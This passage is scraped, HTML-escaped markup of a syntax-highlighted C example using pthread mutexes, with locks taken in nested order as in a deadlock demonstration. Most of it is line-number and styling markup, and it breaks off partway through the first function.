    pthread_mutex_destroy(&amp;amp;mutex1); 
    pthread_mutex_destroy(&amp;amp;mutex2); 
    pthread_mutex_destroy(&amp;amp;mutex3); 
    pthread_mutex_destroy(&amp;amp;mutex4); 

    return 0; 
 }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-68&quot;&gt;68&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-69&quot;&gt;69&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-70&quot;&gt;70&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-71&quot;&gt;71&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-72&quot;&gt;72&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-73&quot;&gt;73&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-74&quot;&gt;74&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-75&quot;&gt;75&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-76&quot;&gt;76&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-77&quot;&gt;77&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-78&quot;&gt;78&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-79&quot;&gt;79&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-80&quot;&gt;80&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-81&quot;&gt;81&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-82&quot;&gt;82&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-83&quot;&gt;83&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-84&quot;&gt;84&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-85&quot;&gt;85&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-86&quot;&gt;86&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-87&quot;&gt;87&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-88&quot;&gt;88&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-89&quot;&gt;89&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-90&quot;&gt;90&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-91&quot;&gt;91&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-92&quot;&gt;92&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-93&quot;&gt;93&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-94&quot;&gt;94&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-95&quot;&gt;95&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-96&quot;&gt;96&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-97&quot;&gt;97&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-98&quot;&gt;98&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-99&quot;&gt;99&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-100&quot;&gt;100&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-101&quot;&gt;101&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-102&quot;&gt;102&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-103&quot;&gt;103&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-104&quot;&gt;104&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-105&quot;&gt;105&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-106&quot;&gt;106&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-107&quot;&gt;107&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-108&quot;&gt;108&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-109&quot;&gt;109&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-110&quot;&gt;110&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-111&quot;&gt;111&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-112&quot;&gt;112&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-113&quot;&gt;113&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-114&quot;&gt;114&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-115&quot;&gt;115&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-116&quot;&gt;116&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-117&quot;&gt;117&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-118&quot;&gt;118&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-119&quot;&gt;119&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07774403199713-120&quot;&gt;120&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07774403199713-121&quot;&gt;121&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#include &amp;lt;unistd.h&amp;gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#include &amp;lt;pthread.h&amp;gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#include &amp;lt;string.h&amp;gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_t &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;PTHREAD_MUTEX_INITIALIZER&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_t &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;PTHREAD_MUTEX_INITIALIZER&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_t &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;PTHREAD_MUTEX_INITIALIZER&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_t &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;PTHREAD_MUTEX_INITIALIZER&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-9&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-m&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;func1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_lock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_lock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_unlock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_unlock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07774403199713-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sequence1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07774403199713-24&quot;&gt;
